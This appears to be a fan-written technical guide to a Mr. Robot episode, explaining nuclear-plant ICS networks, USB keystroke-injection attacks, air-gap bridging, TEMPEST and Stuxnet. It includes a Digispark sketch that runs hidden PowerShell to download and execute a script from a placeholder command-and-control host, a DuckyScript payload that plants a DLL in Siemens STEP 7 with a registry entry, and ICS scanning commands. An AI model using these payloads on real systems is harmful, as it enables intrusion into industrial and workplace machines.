# Episode 11: eps4.10_411lengthrequired.h

## Season 4, Episode 11 | "411 Length Required"

**Air Date:** December 15, 2019
**Directed by:** Sam Esmail

### Overview

The episode title references HTTP status code 411, which indicates that the server requires a Content-Length header in the request. Without knowing the "length" (scope, scale) of what is being sent, the server refuses to process it. This mirrors Whiterose's mysterious machine at the Washington Township Power Plant: no one truly understands its full scope or purpose. The episode delves into industrial control system security, air-gapped network attacks, and the terrifying potential of compromising nuclear facility safety systems.

---

## Hacks & Techniques

### 1. Whiterose's Machine at Washington Township Plant

Whiterose's machine is housed within the Washington Township Nuclear Power Plant, requiring control over industrial and nuclear facility infrastructure. The technical details surrounding the machine draw on real-world nuclear facility and ICS security concepts.

#### Nuclear Power Plant Control Architecture

```
+--------------------------------------------------+
| CORPORATE NETWORK (Level 4-5)                    |
| - Business systems, email, internet access       |
+--------------------------------------------------+
              | (Data Diode - one way)
+--------------------------------------------------+
| PLANT DMZ (Level 3.5)                            |
| - Historian servers, patch management            |
+--------------------------------------------------+
              | (Firewall)
+--------------------------------------------------+
| SUPERVISORY CONTROL (Level 3)                    |
| - Engineering workstations                        |
| - SCADA/HMI servers                               |
| - Plant historian (real-time data collection)     |
+--------------------------------------------------+
              | (Industrial Firewall)
+--------------------------------------------------+
| PROCESS CONTROL (Level 2)                        |
| - PLCs (Programmable Logic Controllers)           |
| - RTUs (Remote Terminal Units)                    |
| - Safety Instrumented Systems (SIS)              |
+--------------------------------------------------+
              | (Hardwired connections)
+--------------------------------------------------+
| PHYSICAL PROCESS (Level 0-1)                     |
| - Sensors, actuators, valves                      |
| - Reactor control rods                            |
| - Cooling systems                                 |
| - Turbine generators                              |
+--------------------------------------------------+
```

#### Nuclear Facility Specific Systems

- **Reactor Protection System (RPS):** Automatically initiates a reactor SCRAM (emergency shutdown) when safety parameters are exceeded.
- **Engineered Safety Features Actuation System (ESFAS):** Activates emergency systems like containment spray, emergency core cooling, and containment isolation.
- **Nuclear Instrumentation System (NIS):** Monitors neutron flux levels in the reactor core.
- **Plant Process Computer (PPC):** Collects and processes plant data for operators and archival.
- **Safety Instrumented System (SIS):** Independent safety layer that monitors critical parameters and triggers shutdowns independently of the main control system.

### 2. Digispark USB Attack Deployment (Washington Township Plant)

Elliot plugs a **Digispark ATtiny85** USB device into a terminal at the Washington Township Nuclear Power Plant. Security expert **Trammell Hudson** (Vice "Hackers Dissect" roundtable) identified the on-screen device as "an Arduino compatible ATtiny85 system that can pretend to be USB devices."

#### Attack Execution

The Digispark registers as a USB keyboard (HID device) and begins injecting automated keystrokes:

1. **USB insertion** — the OS auto-trusts the device as a keyboard
2. **PowerShell invocation** — the device types out a PowerShell command
3. **"fuxor" program execution** — encrypts the `/bin` directory after gathering entropy
4. **Ransomware-style lockout** — facility control systems are encrypted

```
Attack Flow:
[Digispark inserted] → [OS recognizes HID keyboard]
       → [Automated keystrokes begin]
       → [PowerShell launch]
       → [fuxor ransomware deploys]
       → [/bin directory encrypted]
       → [ICS systems locked]
```

#### Why Digispark Over Rubber Ducky?

The Digispark is a $2–6 DIY alternative to the $80 Hak5 USB Rubber Ducky. Its exposed PCB makes it conspicuous, but in this scenario Elliot has physical access and doesn't need stealth — he just needs keystroke injection to deploy the payload. Security expert **Harlo Holmes** compared the approach to "bringing a knife to a gunfight," noting its similarity to the municipal ransomware attacks prevalent at that time.

#### Digispark Payload Example (Arduino C++)

```cpp
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(2000);  // Wait for OS enumeration

  // Open PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell -w hidden -ep bypass");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Deploy fuxor ransomware
  DigiKeyboard.print("IEX(New-Object Net.WebClient).DownloadString('http://[C2]/fuxor.ps1')");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
```

> **Note:** Security expert Trammell Hudson observed that "the meltdown was inevitable when Whiterose switched on the machine; the malware didn't have any effect" — meaning Elliot arrived too late regardless of the Digispark's success.

#### Real-World USB HID Attack Parallels

- **BadUSB (SRLabs, Black Hat 2014):** Karsten Nohl demonstrated that USB firmware can be reprogrammed to act as a keyboard, bypassing all traditional security. Up to half of leading USB controller chips were found vulnerable.
- **FIN7 BadUSB Campaign (2021-2022):** The FBI issued a flash alert (PIN 220107-001) warning that FIN7 was mailing LilyGO-branded BadUSB devices to US businesses. The devices injected PowerShell commands to install GRIFFON malware, leading to BlackMatter and REvil ransomware.
- **CVE-2023-45866:** Critical Bluetooth HID vulnerability enabling keystroke injection on Android, Linux, macOS, and iOS without physical USB access.

### 3. Industrial Control Systems / Nuclear Facility Networks

Understanding the unique characteristics of ICS networks in nuclear facilities is essential to understanding the episode's technical backdrop.

#### ICS vs IT Security Differences

| Aspect | IT Systems | ICS/OT Systems |
|---|---|---|
| **Priority** | Confidentiality > Integrity > Availability | Availability > Integrity > Confidentiality |
| **Patching** | Regular, automated | Rare, requires plant shutdown |
| **Lifespan** | 3-5 years | 15-30+ years |
| **Real-time** | Generally not critical | Millisecond-level requirements |
| **Safety** | Data loss/breach | Physical damage, loss of life |
| **Protocol** | TCP/IP standard | Modbus, DNP3, OPC, proprietary |
| **Updates** | Frequent | Vendor-dependent, slow |

#### ICS Vulnerability Classes

1. **Protocol Vulnerabilities:**
   - Modbus has no authentication, no encryption, no access control.
   - DNP3 authentication was bolted on as Secure Authentication v5 and is not universally deployed.
   - S7comm (Siemens) has known replay attack vulnerabilities.

2. **Engineering Workstation Compromise:**
   - These Windows-based systems run engineering software (Siemens STEP 7, Rockwell RSLogix).
   - Often run outdated OS versions (Windows XP, Windows 7) because vendor software does not support newer versions.
   - Compromise of an engineering workstation provides the ability to reprogram PLCs.

3. **HMI Vulnerabilities:**
   - Web-based HMIs often have SQL injection, XSS, and authentication bypass vulnerabilities.
   - HMI applications may run with SYSTEM/root privileges.

4. **PLC Vulnerabilities:**
   - Many PLCs have no authentication for programming.
   - Firmware can be modified to create persistent backdoors.
   - PLC logic can be modified to cause physical damage while showing normal readings to operators.

### 3. Air-Gapped Network Breach Techniques

Nuclear facilities and other critical infrastructure maintain air gaps: physical separation between sensitive control networks and the internet. However, air gaps can be bridged.

#### USB Bridging

The most common method for crossing air gaps:

- **Stuxnet Model:** Stuxnet propagated from internet-connected systems to air-gapped Iranian nuclear facility networks via infected USB drives.
- **Agent.btz:** Infected US military classified networks (SIPRNet) through USB drives in 2008.
- **Supply Chain:** Compromise USB drives during manufacturing or shipping.

#### USB Attack Process

```
Phase 1: Infect USB on Internet-Connected System
[Internet] --> [Compromised PC] --> [USB Drive Infected]

Phase 2: Human Bridge (Social Engineering/Insider)
[Infected USB] --> [Employee carries to air-gapped facility]

Phase 3: Execute on Air-Gapped System
[USB inserted] --> [Malware executes] --> [Compromises ICS network]

Phase 4: Data Exfiltration (Reverse Path)
[Collected data on USB] --> [Employee removes USB] --> [Data reaches attacker]
```

#### TEMPEST (Electromagnetic Emanations)

TEMPEST refers to the unintentional electromagnetic emissions from electronic equipment that can be intercepted to reconstruct the data being processed.

- **Van Eck Phreaking:** Reconstructing monitor contents by capturing electromagnetic emissions from the video cable and display.
- **Keyboard Emanations:** Detecting keystrokes through electromagnetic emissions from keyboard cables.
- **TEMPEST-Certified Equipment:** Military and intelligence agencies use specially shielded equipment (TEMPEST/EMSEC certified) to prevent electromagnetic leakage.

##### TEMPEST Attack Methods

| Method | Channel | Range | Data Rate |
|---|---|---|---|
| **Monitor Emanations** | EM radiation from display cables | 10-100m | Medium |
| **Keyboard Emanations** | EM from keyboard/USB cables | 5-20m | Low |
| **LED Blinking** | Modulated LED on network cards | Line of sight, 100m+ | Low |
| **Acoustic** | Sound from CPU/power supply | 1-10m | Very Low |
| **Power Line** | Fluctuations on electrical grid | Building-wide | Very Low |
| **Thermal** | Heat emissions from components | <1m | Extremely Low |

#### Side-Channel Attacks

Side-channel attacks extract information from physical implementation characteristics rather than algorithmic weaknesses:

- **Timing Attacks:** Measuring the time taken by cryptographic operations to infer secret keys.
- **Power Analysis:** Monitoring power consumption of a device during cryptographic operations.
  - **Simple Power Analysis (SPA):** Directly observing power traces.
  - **Differential Power Analysis (DPA):** Statistical analysis of many power traces.
- **Acoustic Cryptanalysis:** Using the sound emitted by a computer during encryption to extract keys (demonstrated against RSA by Genkin, Shamir, and Tromer in 2013).
- **Cache Timing Attacks:** Exploiting differences in memory access times for cached vs uncached data (Spectre, Meltdown).

#### Other Air-Gap Bridging Techniques (Research)

- **AirHopper (2014):** Exfiltrate data from an air-gapped computer through FM radio signals generated by the monitor cable.
- **BitWhisper (2015):** Communicate between two adjacent air-gapped computers using thermal emissions.
- **GSMem (2015):** Exfiltrate data from an air-gapped computer by generating cellular radio signals using the memory bus.
- **DiskFiltration (2016):** Exfiltrate data through acoustic signals generated by controlling the hard drive's read/write head movements.
- **MOSQUITO (2018):** Turn connected speakers or headphones into microphones for air-gap data exfiltration.
- **PowerHammer (2018):** Exfiltrate data through fluctuations in the power line.

### 4. SCADA Safety Interlock Systems

Safety Instrumented Systems (SIS) are the last line of defense in industrial environments, designed to bring a process to a safe state when safety limits are exceeded.

#### Safety Integrity Levels (SIL)

| SIL Level | Probability of Failure on Demand | Application |
|---|---|---|
| **SIL 1** | 0.1 to 0.01 | Low-risk industrial processes |
| **SIL 2** | 0.01 to 0.001 | Medium-risk processes |
| **SIL 3** | 0.001 to 0.0001 | High-risk processes (nuclear, chemical) |
| **SIL 4** | 0.0001 to 0.00001 | Highest risk (nuclear reactor protection) |

#### SIS Architecture

```
+------------------+     +------------------+     +------------------+
| Field Sensors    |---->| Safety PLC       |---->| Final Elements   |
| (Temperature,    |     | (e.g., Triconex, |     | (Emergency       |
|  Pressure,       |     |  HIMA, ABB)      |     |  shutoff valves, |
|  Level, Flow)    |     |                  |     |  reactor SCRAM)  |
+------------------+     +------------------+     +------------------+
                                |
                          Independent of
                          main process
                          control system
```

#### SIS Attack Implications

- **Compromising SIS = Removing Safety Net:** If the SIS is disabled or manipulated, the process can enter dangerous states without automatic shutdown.
- **TRITON/TRISIS Precedent:** The TRITON malware (2017) specifically targeted Schneider Electric's Triconex SIS at a Saudi petrochemical plant. The attack could have caused a catastrophic explosion by disabling safety systems while simultaneously manipulating process controls to create dangerous conditions.
- **Defense in Depth:** SIS should be physically and logically separated from the basic process control system (BPCS), using different hardware, different networks, and different engineering tools.

### 5. Stuxnet Parallels for ICS Attacks

Stuxnet remains the most sophisticated and well-documented ICS attack, and its techniques parallel many concepts shown in the episode.

#### Stuxnet Technical Details

- **Discovery:** June 2010 by Sergey Ulasen at VirusBlokAda (Belarusian antivirus company).
- **Attribution:** Joint US-Israeli operation (Operation Olympic Games).
- **Target:** Iran's Natanz uranium enrichment facility, specifically Siemens S7-315 and S7-417 PLCs controlling centrifuge cascades.

#### Stuxnet Attack Chain

```
1. Initial Access: Infected USB drive
         |
2. Propagation: Multiple zero-days
   - MS10-046 (LNK/PIF shortcut vulnerability)
   - MS10-061 (Print Spooler vulnerability)
   - MS10-073 (Win32k.sys privilege escalation)
   - MS10-092 (Task Scheduler privilege escalation)
         |
3. Lateral Movement: Network shares, WinCC database exploit
         |
4. Target Identification: Search for Siemens STEP 7 software
   - Check for specific PLC configuration
   - Verify Profibus network with specific device IDs
   - Confirm frequency converter types (Vacon and Fararo Paya)
         |
5. PLC Modification: Inject malicious code into S7-315
   - Replace OB1 (main organization block)
   - Replace OB35 (timer interrupt block - 100ms cycle)
   - Intercept and modify centrifuge speed commands
         |
6. Physical Effect:
   - Normal centrifuge speed: 1064 Hz
   - Stuxnet periodically changed to: 1410 Hz (overspeed)
   - Then to: 2 Hz (near-stop)
   - Cycle repeated, causing mechanical stress and centrifuge failure
         |
7. Deception: Record normal sensor readings and replay to HMI
   - Operators see normal operations
   - Centrifuges are actually destroying themselves
```

#### Key Stuxnet Innovations

- **PLC Rootkit:** First known rootkit for programmable logic controllers.
- **Man-in-the-Middle on PLC:** Intercepted communications between engineering software and PLCs to hide malicious code.
- **Four Zero-Days:** Used four previously unknown Windows vulnerabilities simultaneously.
- **Stolen Digital Certificates:** Signed drivers with legitimate certificates stolen from Realtek and JMicron to bypass driver signing requirements.
- **Precision Targeting:** Only activated when it detected the exact PLC configuration and frequency converter setup used at Natanz.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **Siemens STEP 7** | PLC programming environment (attack vector) |
| **Metasploit ICS Modules** | ICS-specific exploitation |
| **CHIPSEC** | Firmware analysis of industrial hardware |
| **Wireshark** | ICS protocol analysis (Modbus, S7comm dissectors) |
| **PLCScan** | PLC enumeration and identification |
| **Nmap ICS Scripts** | Network scanning with ICS-specific NSE scripts |
| **GRASSMARLIN** | NSA-developed ICS network mapping tool |
| **Shodan** | Discovery of internet-exposed ICS devices |
| **Custom USB Payloads** | Air-gap bridging through removable media |

---

## Commands Shown

### ICS Network Reconnaissance

```bash
# Scan for Siemens S7 PLCs
nmap -sV -p 102 --script s7-info target-range/24

# Scan for Modbus devices
nmap -sV -p 502 --script modbus-discover target-range/24

# Scan for BACnet devices
nmap -sU -p 47808 --script bacnet-info target-range/24

# GRASSMARLIN for passive ICS discovery
java -jar grassmarlin.jar
# Import PCAP files for offline analysis
```

### Modbus Interaction

```python
#!/usr/bin/env python3
"""Modbus communication with PLC"""
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('plc-target-ip', port=502)
client.connect()

# Read holding registers (sensor values)
result = client.read_holding_registers(0, 10, slave=1)
print(f"Register values: {result.registers}")

# Read coils (digital outputs)
coils = client.read_coils(0, 16, slave=1)
print(f"Coil values: {coils.bits}")

# Write single register (DANGEROUS - changes process control)
# client.write_register(0, 1000, slave=1)

# Write single coil (DANGEROUS - toggles output)
# client.write_coil(0, True, slave=1)

client.close()
```

### Air-Gap USB Payload

```bash
# Create autorun payload for Windows target
# (Modern Windows has autorun disabled by default for USB)

# Use BadUSB approach instead (Rubber Ducky / Bash Bunny)
# DuckyScript payload for ICS workstation:
REM Target: Siemens STEP 7 Engineering Workstation
DELAY 2000
GUI r
DELAY 500
STRING cmd /c copy E:\payload.dll "C:\Program Files\Siemens\STEP 7\S7BIN\"
ENTER
DELAY 1000
STRING cmd /c reg add "HKLM\SOFTWARE\Siemens\STEP 7" /v Extension /t REG_SZ /d "payload.dll" /f
ENTER
```

### TEMPEST Signal Analysis

```bash
# Using GNU Radio for electromagnetic signal capture
# (Requires SDR hardware: RTL-SDR, HackRF, USRP)

# Capture electromagnetic emanations
gnuradio-companion  # Launch GNU Radio GUI

# TempestSDR - Monitor emanations to reconstruct display
java -jar TempestSDR.jar
# Configure: Sample rate, frequency, resolution, frame rate

# Using rtl_sdr for raw signal capture
rtl_sdr -f 500e6 -s 2.4e6 -g 40 capture.raw
```

---

## Real-World Parallels

### Nuclear Facility Cyberattacks

- **Stuxnet (2010):** As detailed above, the most sophisticated cyberweapon ever deployed, specifically targeting Iranian nuclear infrastructure through air-gapped networks.
- **Davis-Besse Nuclear Power Plant (2003):** The Slammer worm penetrated the plant's network, disabling the Safety Parameter Display System (SPDS) for nearly five hours. The worm entered through a contractor's VPN connection that bypassed the firewall.
- **Gundremmingen Nuclear Plant (2016):** A German nuclear power plant discovered W32.Ramnit and Conficker malware on systems connected to fuel rod handling equipment. The systems were air-gapped from the internet, but the malware was introduced via USB drives.
- **Kudankulam Nuclear Power Plant (2019):** India's newest nuclear power plant was confirmed to have been infected with DTrack malware (attributed to North Korea's Lazarus Group) on its administrative network.

### Air-Gap Bridging in Real Attacks

- **Stuxnet USB Propagation:** The primary delivery method for crossing the Natanz air gap was infected USB drives carried by contractors and employees.
- **Agent.btz (2008):** Infected USB drives left in parking lots near US military bases in the Middle East led to the compromise of classified DOD networks, directly leading to the creation of US Cyber Command.
- **Equation Group (NSA TAO):** Leaked NSA tools revealed sophisticated air-gap bridging capabilities including firmware-level USB implants and covert communication channels.

### TEMPEST Research

- **Van Eck Phreaking (1985):** Wim van Eck published research demonstrating that CRT monitor contents could be reconstructed from electromagnetic emanations at a distance of hundreds of meters.
- **Ben-Gurion University Research:** Researchers at Ben-Gurion University's Cyber Security Research Center have published extensively on air-gap bridging techniques, including AirHopper, BitWhisper, GSMem, DiskFiltration, LED-it-Go, and MOSQUITO.
- **NATO TEMPEST Standards:** NATO's SDIP-27 (formerly AMSG 720B) and related standards define emission security requirements for equipment handling classified information.

### TRITON/TRISIS (2017) - SIS Attack

The most alarming ICS attack in history because it targeted safety systems:

- **Target:** Schneider Electric Triconex Safety Instrumented System at a Middle Eastern petrochemical plant.
- **Attribution:** Initially attributed to a Russian government research institute (Central Scientific Research Institute of Chemistry and Mechanics / TsNIIkhM).
- **Impact:** The attack was designed to disable the SIS, which could have enabled the attackers to cause a catastrophic explosion or toxic release.
- **Discovery:** The malware was discovered only because a bug in the code caused the SIS to trigger a safe shutdown, alerting plant operators to the anomaly.
- **Significance:** Demonstrated that nation-state actors are willing to compromise safety systems, crossing a line from espionage and disruption to potential mass casualties.

## Tool Links

- [Metasploit](https://www.metasploit.com/) - ICS-specific exploitation modules
- [Wireshark](https://www.wireshark.org/) - ICS protocol analysis (Modbus, S7comm)
- [Nmap](https://nmap.org/) - Network scanning with ICS-specific NSE scripts
- [Shodan](https://www.shodan.io/) - Discovery of internet-exposed ICS devices
- [pymodbus](https://github.com/pymodbus-dev/pymodbus) - Modbus TCP communication in Python
- [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) - USB payloads for air-gap bridging
- [Bash Bunny](https://shop.hak5.org/products/bash-bunny) - Multi-vector USB attack platform
- [Digispark](http://digistump.com/products/1) - ATtiny85-based USB HID keystroke injection device (used by Elliot in this episode)
- [Arduino IDE](https://www.arduino.cc/en/software) - Programming environment for Digispark payloads
- [GNU Radio](https://www.gnuradio.org/) - SDR framework for TEMPEST signal analysis

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| Nuclear ICS/SCADA compromise | T1190 | Exploit Public-Facing Application | https://attack.mitre.org/techniques/T1190/ |
| USB attack on air-gapped networks | T1091 | Replication Through Removable Media | https://attack.mitre.org/techniques/T1091/ |
| PLC logic modification | T1565 | Data Manipulation | https://attack.mitre.org/techniques/T1565/ |
| Safety Instrumented System compromise | T1562 | Impair Defenses | https://attack.mitre.org/techniques/T1562/ |
| TEMPEST electromagnetic emanations | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |
| Side-channel attacks | T1040 | Network Sniffing | https://attack.mitre.org/techniques/T1040/ |
| ICS network reconnaissance (Modbus, S7) | T1046 | Network Service Discovery | https://attack.mitre.org/techniques/T1046/ |
| USB supply chain compromise | T1195 | Supply Chain Compromise | https://attack.mitre.org/techniques/T1195/ |
| Digispark USB HID keystroke injection | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |

## References and Further Reading

- **Stuxnet (2010)** - Most sophisticated cyberweapon ever deployed, targeting Iranian nuclear infrastructure
- **TRITON/TRISIS (2017)** - Attack on Safety Instrumented Systems at a petrochemical plant
- **Davis-Besse Nuclear Power Plant (2003)** - Slammer worm disabled Safety Parameter Display System
- **Gundremmingen Nuclear Plant (2016)** - Malware found on fuel rod handling systems
- **Kudankulam Nuclear Power Plant (2019)** - DTrack malware (Lazarus Group) on administrative network
- **Agent.btz (2008)** - Infected USB drives at US military bases led to creation of US Cyber Command
- **Ben-Gurion University Air-Gap Research** - AirHopper, BitWhisper, GSMem, DiskFiltration techniques
- **Van Eck Phreaking (1985)** - Monitor content reconstruction via electromagnetic emanations
- **NATO SDIP-27** - TEMPEST emission security standards
- **BadUSB (SRLabs, Black Hat 2014)** - USB firmware trust model vulnerability demonstrated by Karsten Nohl
- **FIN7 BadUSB Campaign (FBI PIN 220107-001, 2022)** - Physical USB keystroke injection devices mailed to US businesses
- **CVE-2023-45866** - Bluetooth HID keystroke injection affecting Android, Linux, macOS, iOS
- **Vice "Hackers Dissect" S4E11** - Security experts Trammell Hudson and Harlo Holmes identified the on-screen device as a Digispark

## Search Tags

```
tags: [metasploit, wireshark, nmap, shodan, pymodbus, USB-rubber-ducky, bash-bunny, digispark, ATtiny85, USB-HID, BadUSB, keystroke-injection, fuxor, ransomware, ICS, SCADA, PLC, nuclear, air-gap, TEMPEST, side-channel, Stuxnet, TRITON, SIS, Modbus, S7comm, PowerShell]
season: 4
episode: 11
mitre: [T1190, T1091, T1565, T1562, T1040, T1046, T1195, T1200]
```
